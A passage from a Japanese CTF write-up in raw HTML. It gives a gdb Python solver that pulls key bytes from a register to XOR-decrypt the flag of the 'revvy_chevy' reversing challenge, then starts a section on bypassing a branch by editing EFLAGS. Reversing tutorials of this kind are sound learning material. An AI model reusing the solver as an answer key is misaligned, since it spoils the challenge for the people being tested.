&lt;p&gt;これを実行すると、gdbでプログラムを実行して0x40バイト分の文字列を入力し、&lt;code class=&quot;language-text&quot;&gt;0x5555555552ba&lt;/code&gt;のブレークポイントで処理を停止して、その後デバッグを終了するという処理を自動化することができます。&lt;/p&gt;
&lt;p&gt;呼び出しはPythonからではなく、以下のように&lt;code class=&quot;language-text&quot;&gt;gdb -x&lt;/code&gt;コマンドを使います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;gdb -x solver.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後に、キーを取得する処理を追加してFlagを取得していきます。&lt;/p&gt;
&lt;h3 id=&quot;flag取得&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#flag%E5%8F%96%E5%BE%97&quot; aria-label=&quot;flag取得 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Flag取得&lt;/h3&gt;
&lt;p&gt;ここまでくればあとは簡単です。&lt;/p&gt;
&lt;p&gt;先ほど手動で実行していたcontinueコマンドを利用して1文字ずつキーを取得する作業を自動化しました。&lt;/p&gt;
&lt;p&gt;これがSolverスクリプトです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# gdb -x solver.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; gdb

BINDIR &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;~/Downloads&quot;&lt;/span&gt;
BIN &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;revvy_chevy&quot;&lt;/span&gt;
INPUT &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./in.txt&quot;&lt;/span&gt;
BREAK &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;0x5555555552ba&quot;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Ghidraから取得したバイト列&lt;/span&gt;
data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x95&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x4e&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xba&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xdb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x47&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x64&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x09&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x2d&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xd1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xbf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x8a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x9d&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xde&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x5a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xd7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x5c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x93&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x09&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x97&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xd0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x57&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xdb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xde&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x09&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xa0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x9b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x8a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x76&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x2f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xb1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x57&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xa2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x4f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xb9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x81&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xbf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xb9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xbf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x79&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xcf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xdf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xf9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x9f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x8f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x39&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x2f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x81&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x00&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
key &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;INPUT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;write&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;file {}/{}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BINDIR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BIN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;b *{}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BREAK&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;run &amp;lt; {}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;INPUT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# 0x40文字分のキーを取得して key に格納する&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;# gdb.execute(&apos;p $al&apos;)&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parse_and_eval&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;$al&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    key&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;append&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;format_string&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;continue&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# 取得したキーを元にFlagを復号する&lt;/span&gt;
flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    flag &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
gdb&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;quit&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これを実行すると、最終的にFlagの文字列が取得できます。&lt;/p&gt;
&lt;h2 id=&quot;おまけよく使うgdbのテクニック&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86gdb%E3%81%AE%E3%83%86%E3%82%AF%E3%83%8B%E3%83%83%E3%82%AF&quot; aria-label=&quot;おまけよく使うgdbのテクニック permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;おまけ：よく使うgdbのテクニック&lt;/h2&gt;
&lt;p&gt;最後に、今回の問題では使用しなかったテクニックについても補足しておきます。&lt;/p&gt;
&lt;p&gt;解析のために、以下のソースコードをコンパイルしたプログラムを使用します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;is_vulun&lt;/code&gt;が1の場合にのみ、keyを作成するループが実行されるプログラムです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;TEXT&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Enjoy debug!\n&quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TEXT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; is_vulun &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;is_vulun &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    	&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        	key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Key %s\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Finish!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まずはこのソースコードを&lt;code class=&quot;language-text&quot;&gt;easy.c&lt;/code&gt;として保存して、&lt;code class=&quot;language-text&quot;&gt;gcc easy.c -o easy&lt;/code&gt;で実行ファイルを作成します。&lt;/p&gt;
&lt;p&gt;しかし、コンパイルしたプログラムを実行してみたものの、&lt;code class=&quot;language-text&quot;&gt;is_vulun = 0&lt;/code&gt;となっているためにキー生成のループは実行されませんでした。&lt;/p&gt;
&lt;h3 id=&quot;efragsを書き換えて条件分岐をバイパスする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#efrags%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%A6%E6%9D%A1%E4%BB%B6%E5%88%86%E5%B2%90%E3%82%92%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E3%81%99%E3%82%8B&quot; aria-label=&quot;efragsを書き換えて条件分岐をバイパスする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 